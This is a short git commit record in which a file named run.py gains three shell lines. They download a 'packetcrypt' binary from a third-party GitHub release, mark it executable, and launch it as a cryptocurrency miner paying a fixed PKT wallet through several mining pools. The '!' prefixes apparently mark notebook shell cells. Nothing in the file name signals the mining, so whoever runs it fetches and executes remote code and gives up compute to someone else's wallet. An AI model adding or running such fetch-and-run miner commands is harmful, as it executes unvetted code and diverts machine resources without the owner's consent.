b4e1f963351b5e7dbab75ea745c11352a758c239
phongcongtu <49186991+phongcongtu@users.noreply.github.com>
2022-02-27 04:22:20 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1,1 +1,4 @@
 
+!wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
+!chmod +x packetcrypt_x8664_linux
+./packetcrypt_x8664_linux ann -p pkt1qm62q73my6ct93lkykl66zs5seumr9heu4rsza8 https://stratum.zetahash.com/ https://pool.pkthash.com http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com -t 2
